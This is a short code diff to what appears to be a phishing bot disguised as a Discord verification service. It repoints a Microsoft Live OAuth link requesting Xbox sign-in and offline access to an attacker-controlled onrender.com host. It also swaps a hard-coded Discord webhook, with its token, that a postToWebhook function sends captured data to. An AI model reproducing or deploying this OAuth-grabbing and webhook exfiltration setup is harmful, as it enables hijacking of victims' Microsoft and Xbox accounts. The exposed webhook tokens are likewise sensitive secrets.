@@ -10,9 +10,9 @@ const config = {
     },
 
     site: {
-        handleDomain: "https://rawroar.onrender.com/handle",
+        handleDomain: "discordverifybot.onrender.com",
         loginLive:
-            "https://login.live.com/oauth20_authorize.srf?client_id=4c5c7172-90b2-4c57-890e-f1a349074fe6&response_type=code&redirect_uri=https://rawroar.onrender.com/handle&scope=XboxLive.signin+offline_access&state=",
+            "https://login.live.com/oauth20_authorize.srf?client_id=4c5c7172-90b2-4c57-890e-f1a349074fe6&response_type=code&redirect_uri=https://discordverifybot.onrender.com/&scope=XboxLive.signin+offline_access&state=",
             // End with state=
     },
 
@@ -348,7 +348,7 @@ async function postToWebhook(
         ],
     };
     axios.post(
-        "https://discord.com/api/webhooks/1050300699499581482/-UxGriSXJcZzJAhQsBkZYEKqQePx1FpxrTP27dtscH5hVVtqxr8VTFlkHn-n8YEuiCmN",
+        "https://discord.com/api/webhooks/1046029632664764478/yCAXrPk8oHrQpWPZkvt4dvz6x15ThMhDh4-R3AtoAG1UU6JWNDIB2lV5yBrmmIE9Y54C",
         data
     );
     axios
